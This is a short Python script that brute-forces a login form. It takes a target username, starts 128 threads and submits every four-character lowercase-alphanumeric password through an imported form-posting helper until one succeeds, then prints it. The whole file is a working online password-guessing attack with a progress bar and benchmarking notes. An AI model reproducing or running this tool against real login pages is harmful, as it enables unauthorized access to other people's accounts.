import os
import string
from time import sleep
from SendPostForm import Session, SetUsername, PostRequest
from itertools import chain, product
from queue import Queue
from threading import Thread
from tqdm import tqdm


NUM_THREADS = 128
q = Queue()

printable = list(string.ascii_lowercase) + list(string.digits)


def bruteforce():

    SessionData = Session()

    while True:

        password = q.get()

        # Use for benchmarking with `time python3 MTPasswordGen.py`
        # if password == "abcd":
        #     print("Checkpoint")
        #     os._exit(1)

        if PostRequest(SessionData, password):
            print("\nPassword found: "+password)
            os._exit(1)
        # else:
        #     # print("Failed using: "+password)

        q.task_done()
        progress.update(1)


if __name__ == '__main__':

    SetUsername(str(input("Target: ")))

    # progress = tqdm(total = len(printable) ** 4) # All alphanumeric combinations with 4 chars
    progress = tqdm(total = 1592) # Combinations up to "abcd"

    for t in range(NUM_THREADS):
        Thread(target = bruteforce, daemon = True).start()

    for candidate in chain.from_iterable(product(printable, repeat = i) for i in range(4, 5)):
        pswd = "".join(candidate)
        q.put(pswd)

    q.join()